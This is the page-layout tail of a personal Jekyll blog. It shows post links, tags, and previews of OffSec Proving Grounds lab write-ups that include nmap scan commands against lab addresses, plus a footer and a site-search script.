aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/blog/posts/go-tui/">Building a Terminal UI for Go CLI Tools</a><li class="text-truncate lh-lg"> <a href="/blog/posts/gha-notif/">Custom GitHub WebHook Notifications via GitHub Actions</a><li class="text-truncate lh-lg"> <a href="/blog/posts/homelab-npm/">Reverse Proxy in Home Lab</a><li class="text-truncate lh-lg"> <a href="/blog/posts/go-coding/">The Way to Go(lang)</a><li class="text-truncate lh-lg"> <a href="/blog/posts/homelab-budgetlord/">Expense Tracking in Home Lab</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/blog/tags/home-lab/">home-lab</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/lab/">lab</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/productivity/">productivity</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/offsec-proving-grounds/">offsec-proving-grounds</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/oscp/">oscp</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/security/">security</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/aws/">aws</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/container/">container</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/programming/">programming</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/docker/">docker</a></div></section></div><div class="toc-border-cover z-3"></div><section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4"><h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2><nav id="toc"></nav></section></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/blog/posts/oscp-pg-set6/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1639897200" data-df="ll" > Dec 19, 2021 </time><h4 class="pt-0 my-2">OffSec PG - Potato, PyExp, Sar, Seppukku</h4><div class="text-muted"><p>Potato Enumeration Machine IP → 192.168.53.101 Network Scan Nmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.53.101 OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel ...</p></div></div></a></article><article class="col"> <a href="/blog/posts/oscp-pg-set5/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1639897200" data-df="ll" > Dec 19, 2021 </time><h4 class="pt-0 my-2">OffSec PG - NoName, SoSimple, OnSystemShellDread, Photographer</h4><div class="text-muted"><p>NoName Enumeration Machine IP → 192.168.225.15 Network Scan Nmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.225.15 OS Detection → os_info Port Service Other de...</p></div></div></a></article><article class="col"> <a href="/blog/posts/oscp-pg-set3/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1639897200" data-df="ll" > Dec 19, 2021 </time><h4 class="pt-0 my-2">OffSec PG - Gaara, Geisha, Ha-Natraj, Inclusiveness</h4><div class="text-muted"><p>Gaara Enumeration Machine IP → 192.168.208.142 Network Scan Nmap scan → nmap -sC -sV -Pn -p- -A -o nmap.txt 192.168.208.142 OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel ...</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/blog/posts/oscp-pg-set3/" class="btn btn-outline-primary" aria-label="Older" ><p>OffSec PG - Gaara, Geisha, Ha-Natraj, Inclusiveness</p></a> <a href="/blog/posts/oscp-pg-set5/" class="btn btn-outline-primary" aria-label="Newer" ><p>OffSec PG - NoName, SoSimple, OnSystemShellDread, Photographer</p></a></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>© <time>2025</time> <a href="https://twitter.com/etheriosking">Tanishq Rupaal</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>Using the <a data-bs-toggle="tooltip" data-bs-placement="top" title="v7.2.4" href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener" >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/blog/tags/home-lab/">home-lab</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/lab/">lab</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/productivity/">productivity</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/offsec-proving-grounds/">offsec-proving-grounds</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/oscp/">oscp</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/security/">security</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/aws/">aws</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/container/">container</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/programming/">programming</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/docker/">docker</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script> document.addEventListener('DOMContentLoaded', () => { SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/blog/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{snippet}</p></article>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); }); </script>
